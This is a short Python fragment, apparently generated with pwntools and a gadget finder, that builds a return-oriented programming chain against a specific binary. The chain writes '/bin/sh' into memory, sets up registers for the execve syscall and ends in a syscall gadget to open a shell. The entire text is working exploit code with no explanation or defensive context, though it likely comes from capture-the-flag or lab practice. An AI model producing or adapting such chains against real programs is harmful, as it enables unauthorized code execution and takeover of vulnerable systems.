payload = p64(0x407777)
#0x0000000000407777: pop rsi; ret; 
payload += p64(0x68662f6e69622f)+p64(0x405866)
# 0x0000000000405866: pop rbx; ret; 
payload += p64(0xc06191)+p64(0x4085a2)
# 0x00000000004085a2: add byte ptr [rbx - 0x7cdf11], al; pop rdi; setb al; ret; 
payload += p64(0x4380b1)+p64(0x408653)
# 0x0000000000408653: lea edx, [rdi - 0x41]; lea eax, [rdi + 0x20]; cmp edx, 0x1a; cmovae eax, edi; ret; 
payload += p64(0x40824f)
# 0x000000000040824f: mov qword ptr [rdx], rsi; pop rbx; ret; 
payload += p64(0x0)+p64(0x407777)
# 0x0000000000407777: pop rsi; ret; 
payload += p64(0x438200)+p64(0x4049db)
# 0x00000000004049db: xor edx, edx; or edi, edx; mov byte ptr [rsi], dil; ret; 
payload += p64(0x407777)
# 0x0000000000407777: pop rsi; ret; 
payload += p64(0x0)+p64(0x405866)
# 0x0000000000405866: pop rbx; ret; 
payload += p64(0xc06094)+p64(0x4085a2)
# 0x00000000004085a2: add byte ptr [rbx - 0x7cdf11], al; pop rdi; setb al; ret; 
payload += p64(0x438070)+p64(0x4084b7)
# 0x00000000004084b7: mov eax, dword ptr [rsp + 0xc]; add rsp, 0x10; pop rbx; pop rbp; pop r12; ret; 
payload += p64(0x0)+p64(0x3b00000000)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x41dd57)
# 0x000000000041dd57: syscall; 
payload += b''
